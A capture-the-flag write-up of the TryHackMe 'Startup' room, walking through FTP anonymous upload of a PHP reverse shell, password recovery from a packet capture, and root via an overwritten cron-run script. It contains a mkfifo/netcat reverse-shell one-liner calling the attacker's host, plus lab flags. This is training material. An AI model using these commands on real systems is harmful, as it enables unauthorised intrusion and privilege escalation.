---
title: "THM: Startup"
date: 2023-12-28 20:55:14
categories:
    - TryHackMe
tags:
    - TryHackMe
    - Linux
    - WireShark
---

# Introduction

 This is a writeup for the [Startup](https://tryhackme.com/room/startup) room in TryHackMe. Supposedly, this beginner room aims to exploit traditional vulnerabilities in unique ways. Pretty interesting!

Description:

> We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

# Enumeration

## Nmap

Starting off with a nmap scan:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to <host_ip>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Here, we can see that:

1. FTP is open, and anonymous login is allowed. Seems like there are two files and a directory in the FTP server.
2. SSH is open, but we shan't touch it yet, since we don't have any credentials.
3. HTTP is open, running Apache.

# Web Server Analysis

Let's start with the lowest hanging fruit first. Going to the web server, we are greeted with this page:

![web](./img/startup/website.png)

Doesn't seem like much. Looking at the source code:

![source](./img/startup/source.png)

Doesn't seem like much either :/ Let's find out what other pages there are on the web server.

## Gobuster

Using gobuster:

```bash
kairos@opensus:~> gobuster dir -u <ip> -w Documents/Tools/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py
```

We get one main interesting result:

```bash
/files                (Status: 301) [Size: 314] [--> http://10.10.242.186/files/]
```

Going to `/files`:

![files](./img/startup/files.png)

These are the files/directory that we saw earlier from the nmap scan. I looked at the `/ftp` directory, but sadly it was just an empty directory.

I downloaded the files to my machine and looked at them:

**notice.txt**

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

**important.jpg**
![important](./img/startup/important.jpg)

These don't seem very helpful at the moment.

# FTP

From the nmap scan, we can see that anonymous login is allowed. Looking at an article by [TechTarget](https://www.techtarget.com/whatis/definition/anonymous-FTP-File-Transfer-Protocol):

> Here's how an anonymous FTP session works step by step.

The user logs into the local host and invokes the FTP program.
They open a connection to the host using either the host name or its IP address.
After connecting to the remote host, they log in with the username "anonymous."
They provide a password. This could be "guest," their email address, or anything else that the site requests.
...

Trying to emulate this, we can try to login to the FTP server with the username `anonymous` and the `guest` password (actually I realised that any password worked).

```bash
┌──(kairos㉿kali)-[~]
└─$ ftp <ip>
Connected to <ip>.
220 (vsFTPd 3.0.3)
Name (<ip>:kairos): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Success! Let's see what we can do with this.

Looking at what is within the FTP server:

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||62437|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.

```

This seems to be almost exactly the same as what we got from `/files` earlier. But there seems to be a hidden file `.test.log`.

From the same TechTarget article, it seems that we can download and upload files from the FTP server (if we have permission to do so).

The commands are `get <filename>` and `put <filename>` respectively.

Downloading the file:

```bash
ftp> get .test.log
local: .test.log remote: .test.log
229 Entering Extended Passive Mode (|||26745|)
150 Opening BINARY mode data connection for .test.log (5 bytes).
100% |*********************************************************|     5       42.45 KiB/s    00:00 ETA
226 Transfer complete.
```

Looking at the file:

```bash
kairos@opensus:~> cat .test.log
test
```

Right. Not helpful at all. Given that it is an FTP server, we can try to upload files to it.

## Reverse Shell

What we are mainly looking for is to hopefully get a reverse shell.

First, we prepare a reverse shell script. I personally like to use [pentestmonkey's reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for this. After changing the IP address to match my machine's, I tried to upload it to the FTP server.

```bash
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||37359|)
553 Could not create file.
```

Yikes. Seems like in this directory, we don't have permission to upload files. Let's try to upload it to the `ftp` directory instead.

```bash
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||41137|)
150 Ok to send data.
100% |*********************************************************|  5493       41.57 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (8.22 KiB/s)
```

Bingo! Going back to `http://<ip>/files/ftp/`, we see that the file has successfully been uploaded.

I set up a netcat listener on my machine to listen for port 1234 that I set in the script. Clicking on the php file...

```bash
┌──(kairos㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [<host_ip>] from (UNKNOWN) [<ip>] 58206
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:58:30 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Successfully got a shell! But it's not a full interactive shell yet. To upgrade it:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
zsh: suspended  nc -lvnp 1234

┌──(kairos㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1234
                               www-data@startup:/$ ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
```

Now, we have a full interactive shell and can use more commands/features.

# Secret Spicy Soup Recipe

Question:
What is the secret spicy soup recipe?

From here, we can see a `recipe.txt` file. Let's see what's inside.

```bash
cat recipe.txt
```

```txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

# User Flag

Question:
What are the contents of user.txt?

Knowing that we are `www-data`, we can try to find the user flag. Usually, the user flag should be in the home directory of the user. But... when we go to `/home`:

```bash
www-data@startup:/home$ ls
lennie
```

There's only one user here that isn't us!! Trying to `cd` into the directory, we unfortunately do not have permissions.

```bash
www-data@startup:/home$ cd lennie
Permission denied
```

Moving back to the previous directory, let's double check the files. Earlier, we saw that there were some directories that seemed out of place, namely `incidents` and `vagrat`.

Looking at the contents of `incidents`, there is a `suspicious.pcapng` file.

```bash
www-data@startup:/home$ cd incidents/; ls
suspicious.pcapng
```

I wanted to download the files to my local machine to be able to analyse it with Wireshark, so I create a Python HTTP server from the machine to get it from my host.

```bash
www-data@startup:/incidents$ python3 -m http.server 1222
Serving HTTP on 0.0.0.0 port 1222 ...
```

On my host machine, I download the file:

```bash
┌──(kairos㉿kali)-[~]
└─$ wget http://<ip>:1222/suspicious.pcapng
```

## Wireshark

Opening the file in Wireshark, there seem to be a bunch of TCP packets. I saw a little bit of the packet details, and saw some Linux commands and a password-like string.

![wireshark](./img/startup/pcap.png)

I then followed the TCP stream to see what was going on.

![stream](./img/startup/stream.png)

It looks like a user was trying to `cd` to `lennie`'s home directory and was denied access. They then tried to run `sudo -l`, and was prompted for a password. They seem to have entered a password `c4ntg3t3n0ughsp1c3` but that ain't the password.

Maybe that was `lennie`'s password instead?

```bash
www-data@startup:/$ su lennie
Password:
lennie@startup:/$
```

Bullseye. Now that we are `lennie`, we can find the `user.txt` flag.

```bash
www-data@startup:/$ ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
lennie@startup:/$ cd /home/lennie/
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

# Root Flag

Earlier, it didn't seem so easy to escalate privileges. But now that we are `lennie`, we can see what we can do.

Looking at what `lennie` has in their home directory:

```bash
lennie@startup:~$ ls -la
total 20
drwx------ 4 lennie lennie 4096 Nov 12  2020 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
```

Scripts seem interesting.

```bash
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt planner.sh

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`startup_list.txt` is empty, but `planner.sh` seems to be a script that runs `/etc/print.sh`. Let's see what's permissions they have for `/etc/print.sh`.

```bash
lennie@startup:~$ ls -la  /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

Hmm... `lennie` owns the file, and has full permissions. We can try to edit the file to get a reverse shell.

```bash
lennie@startup:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <host_ip> 2345 >/tmp/f" > /etc/print.sh
```

I then set up a netcat listener on my machine to listen for port 2345 that I set in the script. I then got a connection!!

```bash
┌──(kairos㉿kali)-[~]
└─$ nc -lvnp 2345
listening on [any] 2345 ...
connect to [<host_ip>] from (UNKNOWN) [10.10.242.186] 36520
sh: 0: can't access tty; job control turned off
# ls
root.txt
# cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

## Alternative

Alternatively, I also tried to use LinPEAS to find any interesting files that I could use to escalate privileges. I had set a Python HTTP server — this time on my host machine — to download the LinPEAS script.

> LinPEAS is Linux Privilege Escalation Awesome Script. It is a script that enumerates the system looking for misconfigurations that could allow for privilege escalation.

```bash
lennie@startup:~$ wget http://<host_ip>:9999/LinPEAS.sh
--2023-12-29 15:31:49--  http://<host_ip>:9999/LinPEAS.sh
Connecting to <host_ip>:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847920 (828K) [text/x-sh]
Saving to: ‘LinPEAS.sh’

LinPEAS.sh          100%[===================>] 828.05K   414KB/s    in 2.0s

2023-12-29 15:31:52 (414 KB/s) - ‘LinPEAS.sh’ saved [847920/847920]

lennie@startup:~$ chmod +x LinPEAS.sh ;  ./LinPEAS.sh
```

Some interesting pieces that I found:

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/print.sh
/home/lennie
/run/cloud-init/tmp
/run/lock
/run/user/1002
/run/user/1002/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1002
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory
```

```bash
╔══════════╣ Executable files potentially added by user (limit 70)
2020-11-12+05:06:53.6932941280 /etc/rc.local.vmimport
2020-11-12+04:53:12.7008125520 /home/lennie/scripts/planner.sh
2020-11-12+04:53:12.6647945530 /etc/print.sh
2020-11-12+04:53:12.6407825540 /incidents/suspicious.pcapng
```

Similarly, we can see that `/etc/print.sh` is an executable script by the user, and is outside of their home directory.

The next steps would still be the same as above.

# Conclusion

This room kinda fried my brain a little, having me to search up a bunch of things, especially on FTP. I absolutely loved the uniqueness of this room, with exploits that aren't quite as similar as the other rooms. 